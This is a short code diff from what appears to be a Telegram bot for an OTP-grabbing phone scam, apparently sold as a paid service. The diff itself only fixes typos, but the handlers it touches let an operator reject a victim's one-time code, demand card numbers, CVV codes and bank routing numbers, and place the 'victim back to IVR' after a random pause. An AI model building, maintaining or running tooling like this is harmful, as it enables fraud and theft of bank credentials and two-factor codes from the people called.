@@ -239,7 +239,7 @@ async def otp_accept_callback(callback: CallbackQuery):
     if callback.data == 'den':
         await callback.message.edit_text(fr'''{msg}
 ❌ Code has been rejected''')
-        await callback.message.answer('🛰 Placin victim back to IVR')
+        await callback.message.answer('🛰 Placing victim back to IVR')
         await asyncio.sleep(randint(8, 20))
         chars = '0123456789'
         parts =ast.literal_eval(user_data['last_call'])
@@ -252,7 +252,7 @@ async def otp_accept_callback(callback: CallbackQuery):
     if callback.data == 'card':
         await callback.message.edit_text(fr'''{msg}
 💳 Card number has been required''')
-        await callback.message.answer('🛰 Placin victim back to IVR')
+        await callback.message.answer('🛰 Placing victim back to IVR')
         await asyncio.sleep(randint(8, 20))
         chars = '0123456789'
         parts =ast.literal_eval(user_data['last_call'])
@@ -265,7 +265,7 @@ async def otp_accept_callback(callback: CallbackQuery):
     if callback.data == 'cvv':
         await callback.message.edit_text(fr'''{msg}
 🔒 Cvv security code has been required''')
-        await callback.message.answer('🛰 Placin victim back to IVR')
+        await callback.message.answer('🛰 Placing victim back to IVR')
         await asyncio.sleep(randint(8, 20))
         chars = '0123456789'
         parts =ast.literal_eval(user_data['last_call'])
@@ -278,7 +278,7 @@ async def otp_accept_callback(callback: CallbackQuery):
     if callback.data == 'rout':
         await callback.message.edit_text(fr'''{msg}
 🔁 Routing number has been required''')
-        await callback.message.answer('🛰 Placin victim back to IVR')
+        await callback.message.answer('🛰 Placing victim back to IVR')
         await asyncio.sleep(randint(8, 20))
         chars = '0123456789'
         parts =ast.literal_eval(user_data['last_call'])
@@ -397,4 +397,5 @@ Please upgrade or purchase the required option to continue\.""",
                              parse_mode="MarkdownV2")
         return
     await message.answer(fr"❌ Oops... Something went wrong!")
+
 
